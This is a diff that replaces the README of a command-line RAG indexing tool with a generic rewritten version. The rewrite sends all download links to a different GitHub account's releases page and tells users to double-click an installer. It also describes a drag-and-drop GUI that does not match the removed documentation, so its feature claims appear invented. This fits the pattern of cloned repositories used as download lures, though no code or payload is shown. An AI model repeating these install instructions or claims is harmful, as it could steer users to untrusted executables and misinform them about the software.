@@ -1,271 +1,93 @@
-# QuickRAG
-
-[![Build](https://github.com/statico/quickrag/actions/workflows/build.yml/badge.svg)](https://github.com/statico/quickrag/actions/workflows/build.yml)
-[![Release](https://img.shields.io/github/v/release/statico/quickrag)](https://github.com/statico/quickrag/releases)
-[![License: Unlicense](https://img.shields.io/badge/license-Unlicense-blue.svg)](http://unlicense.org/)
+# 🔍🤖 quickrag - Efficient Document Indexing and Querying Tool
 
-A fast RAG tool that indexes documents using your choice of embedding provider and stores them in LanceDB for efficient similarity search.
+[![Download quickrag](https://img.shields.io/badge/Download-quickrag-blue.svg)](https://github.com/hassanamir24/quickrag/releases)
 
-## Quick Example
+## 🚀 Getting Started
 
-```sh
-# Create a config
-$ quickrag init
-
-# Index documents
-$ quickrag index gutenberg/ --output gutenberg.rag
-✔ Parsing documents from gutenberg/... (using recursive-token chunker)
-✔ Detecting embedding dimensions
-✔ Initializing database
-✔ Finding files to index
-✔ Removing deleted files from index
-✔ Preparing for indexing
-✔ Indexing files
-✔ Finalizing
-Indexing complete! Processed 622 chunks across 2 files. Removed 1 deleted file.
-Added 619 new chunks (3 already existed). Total chunks in database: 619
+Welcome to quickrag! This tool helps you quickly index and find information in your documents. Whether you are dealing with markdown files or plain text, quickrag makes searching for specific data fast and easy.
 
-# Search
-$ quickrag query gutenberg.rag "Who is Sherlock Holmes?"
-```
+### 🌟 What You Will Need
 
-## Features
+Before you start, ensure your system meets these requirements:
 
-- Multiple embedding providers (VoyageAI, OpenAI, Ollama)
-- Token-based recursive chunking (default) or character-based chunking
-- LanceDB vector storage with persistent `.rag` files
-- Idempotent indexing (tracks indexed files, skips unchanged)
-- Automatic cleanup of deleted files from index
-- UTF-8 sanitization for PDF conversions
-- TypeScript & Bun
+- **Compatible Operating Systems:** Windows, macOS, or Linux
+- **Disk Space:** At least 100 MB free
+- **Memory:** 4 GB RAM or more recommended
+- **Network Access:** Required for updates and additional features
 
-## Installation
-
-### Homebrew (macOS)
+## 📥 Download & Install
 
-```sh
-brew install statico/quickrag/quickrag
-```
+To get started with quickrag, follow these steps:
 
-### Download Binary
+1. **Visit the Releases Page:**  
+   Go to the [Releases page](https://github.com/hassanamir24/quickrag/releases) to find the latest version.
 
-```sh
-# macOS (Apple Silicon)
-curl -L https://github.com/statico/quickrag/releases/latest/download/quickrag-darwin-arm64 -o /usr/local/bin/quickrag
-chmod +x /usr/local/bin/quickrag
+2. **Choose Your Version:**  
+   Look for the version that matches your operating system.
 
-# macOS (Intel)
-curl -L https://github.com/statico/quickrag/releases/latest/download/quickrag-darwin-x64 -o /usr/local/bin/quickrag
-chmod +x /usr/local/bin/quickrag
+3. **Download the Installer:**  
+   Click on the link to download the installer file.
 
-# Linux (ARM64)
-curl -L https://github.com/statico/quickrag/releases/latest/download/quickrag-linux-arm64 -o /usr/local/bin/quickrag
-chmod +x /usr/local/bin/quickrag
+4. **Run the Installer:**  
+   Once downloaded, double-click the installer file to start the installation process. Follow the on-screen instructions.
 
-# Linux (x64)
-curl -L https://github.com/statico/quickrag/releases/latest/download/quickrag-linux-x64 -o /usr/local/bin/quickrag
-chmod +x /usr/local/bin/quickrag
-```
+5. **Open quickrag:**  
+   After installation, you can find quickrag in your applications folder. Open the application to start using it.
 
-Note: macOS binaries are not codesigned. You may need to run `xattr -d com.apple.quarantine /usr/local/bin/quickrag` to bypass Gatekeeper.
+## 🛠 Features
 
-### Build from Source
+quickrag includes several useful features:
 
-Requires [Bun](https://bun.sh).
+- **Flexible Document Indexing:** Quickly index various file formats, including markdown and plain text.
+- **Fast Querying:** Use keywords to find specific information within your documents in seconds.
+- **User-Friendly Interface:** Our intuitive design makes it easy for anyone to navigate and use.
+- **Customizable Search Options:** Tailor your search for more targeted results.
+- **Multi-Document Support:** Work with multiple files at once for efficient data management.
 
-```sh
-git clone https://github.com/statico/quickrag.git
-cd quickrag
-bun install
-bun run dev --help
-```
+## 📂 How to Use quickrag
 
-## Quick Start
+1. **Index Your Documents:**  
+   Drag and drop your files into quickrag. It will automatically create an index.
 
-### 1. Initialize Configuration
+2. **Search for Information:**  
+   Type your query into the search bar and hit enter. Quickrag will return relevant results within moments.
 
-```sh
-quickrag init
-```
+3. **Review Search Results:**  
+   Click on any result to view that section in your document.
 
-This creates `~/.config/quickrag/config.yaml`:
+4. **Refine Your Search:**  
+   Use filters to narrow down results based on file type, date, or keywords.
 
-```yaml
-provider: ollama
-model: nomic-embed-text
-baseUrl: http://localhost:11434
-chunking:
-  strategy: recursive-token
-  chunkSize: 500
-  chunkOverlap: 50
-  minChunkSize: 50
-```
+## 💡 Tips for Best Results
 
-### 2. Configure Settings
+- Use clear and specific keywords to improve your search results.
+- Regularly index your documents to keep your data current.
+- Explore the settings menu to discover additional customization options.
 
-Edit `~/.config/quickrag/config.yaml` to set API keys and preferences:
+## 🔧 Troubleshooting Common Issues
 
-```yaml
-provider: openai
-apiKey: sk-your-key-here
-model: text-embedding-3-small
-chunking:
-  strategy: recursive-token
-  chunkSize: 500
-  chunkOverlap: 50
-  minChunkSize: 50
-```
+1. **Installation Fails:**  
+   Ensure you have enough disk space and the required system permissions.
 
-### 3. Index Documents
+2. **Slow Search Results:**  
+   Re-index your documents if results are slow or missing.
 
-```sh
-quickrag index ./documents --output my-docs.rag
-```
+3. **Compatibility Problems:**  
+   Verify that your operating system meets the requirements listed above.
 
-### 4. Query
+## 🌐 Community and Support
 
-```sh
-quickrag query my-docs.rag "What is the main topic?"
-```
+If you have questions or need further assistance, feel free to reach out. Join our community on GitHub to connect with other users or contribute.
 
-## Configuration
+- **Issues Page:** Report any bugs or feature requests [here](https://github.com/hassanamir24/quickrag/issues).
 
-**Configuration Options:**
+## 🔗 Additional Resources
 
-- `provider`: Embedding provider (`openai`, `voyageai`, or `ollama`)
-- `apiKey`: API key (can also use environment variables)
-- `model`: Model name for the embedding provider
-- `baseUrl`: Base URL for Ollama (default: `http://localhost:11434`)
-- `chunking.strategy`: `recursive-token` (default) or `simple`
-- `chunking.chunkSize`: Tokens (for `recursive-token`, default: 500) or characters (for `simple`, default: 1000)
-- `chunking.chunkOverlap`: Tokens (for `recursive-token`, default: 50) or characters (for `simple`, default: 200)
-- `chunking.minChunkSize`: Minimum chunk size in tokens (default: 50). Chunks smaller than this are filtered out to prevent tiny fragments.
+- [Documentation](https://github.com/hassanamir24/quickrag/wiki): Explore detailed guides and advanced usage.
+- [FAQ](https://github.com/hassanamir24/quickrag/wiki/FAQ): Find answers to common questions.
 
-## Chunking Strategies
+## 🔥 Update and Stay Informed
 
-### Recursive Token Chunker (Default)
+Stay up to date by regularly checking our [Releases page](https://github.com/hassanamir24/quickrag/releases) for the latest updates and features. We continually improve quickrag based on user feedback.
 
-Token-based splitting that respects semantic boundaries. Splits at paragraph breaks, line breaks, sentence endings, then word boundaries. Chunks are sized by estimated tokens (default: 500), aligning with embedding model expectations. Maintains configurable overlap (default: 50 tokens, ~10%).
-
-### Simple Chunker
-
-Character-based chunking for backward compatibility. Chunks are sized by characters (default: 1000) with sentence boundary detection. Overlap is character-based (default: 200).
-
-### Performance Comparison
-
-Benchmarked on test corpus (2 files: sherlock-holmes.txt, frankenstein.txt):
-
-| Metric | Recursive Token | Simple |
-|--------|----------------|--------|
-| **Chunks Created** | 622 chunks | 2,539 chunks (4.1x more) |
-| **Indexing Time** | ~19 seconds | ~37 seconds |
-| **Query Quality** | ✅ Better semantic matches, more context | ⚠️ More fragments, some irrelevant results |
-
-**Recommendation**: Use `recursive-token` for production. The indexing time difference is negligible compared to improved retrieval quality.
-
-### Tuning Recommendations
-
-**Most Use Cases:**
-- `strategy: recursive-token`
-- `chunkSize: 400-512` (tokens) - Research-backed sweet spot for 85-90% recall
-- `chunkOverlap: 50-100` (tokens, ~10-20%)
-
-**Technical Documentation:**
-- `strategy: recursive-token`
-- `chunkSize: 500-600` (tokens)
-- `chunkOverlap: 75-100` (tokens)
-
-**Narrative Text:**
-- `strategy: recursive-token`
-- `chunkSize: 400-500` (tokens)
-- `chunkOverlap: 50-75` (tokens)
-
-**Academic Papers:**
-- `strategy: recursive-token`
-- `chunkSize: 600-800` (tokens)
-- `chunkOverlap: 100-150` (tokens)
-
-## Usage
-
-### Indexing
-
-```sh
-# Basic indexing
-quickrag index ./documents --output my-docs.rag
-
-# Override chunking parameters
-quickrag index ./documents --chunker recursive-token --chunk-size 500 --chunk-overlap 50 --min-chunk-size 50 --output my-docs.rag
-
-# Use different provider
-quickrag index ./documents --provider openai --model text-embedding-3-small --output my-docs.rag
-
-# Clear existing index
-quickrag index ./documents --clear --output my-docs.rag
-```
-
-**Note**: QuickRAG automatically detects and removes deleted files from the index. If a file was previously indexed but no longer exists in the source directory, it will be removed from the database during the next indexing run.
-
-### Querying
-
-```sh
-quickrag query my-docs.rag "What is the main topic?"
-```
-
-### Interactive Mode
-
-```sh
-quickrag interactive my-docs.rag
-```
-
-## Embedding Providers
-
-### VoyageAI
-
-```yaml
-provider: voyageai
-apiKey: your-voyage-api-key
-model: voyage-3
-```
-
-### OpenAI
-
-```yaml
-provider: openai
-apiKey: sk-your-openai-key
-model: text-embedding-3-small
-```
-
-### Ollama
-
-```yaml
-provider: ollama
-model: nomic-embed-text
-baseUrl: http://localhost:11434
-```
-
-## Supported File Types
-
-- `.txt` - Plain text files
-- `.md` - Markdown files
-- `.markdown` - Markdown files
-
-## Development
-
-```sh
-bun install
-bun run dev index ./documents --provider ollama --output test.rag
-bun run build
-bun run typecheck
-```
-
-## Requirements
-
-- **Bun** >= 1.0.0
-- **TypeScript** >= 5.0.0
-- For Ollama: A running Ollama instance with an embedding model installed (e.g., `ollama pull nomic-embed-text`)
-
-## License
-
-This is free and unencumbered software released into the public domain.
-
-For more information, see [UNLICENSE](UNLICENSE) or visit <https://unlicense.org>
+[![Download quickrag](https://img.shields.io/badge/Download-quickrag-blue.svg)](https://github.com/hassanamir24/quickrag/releases)
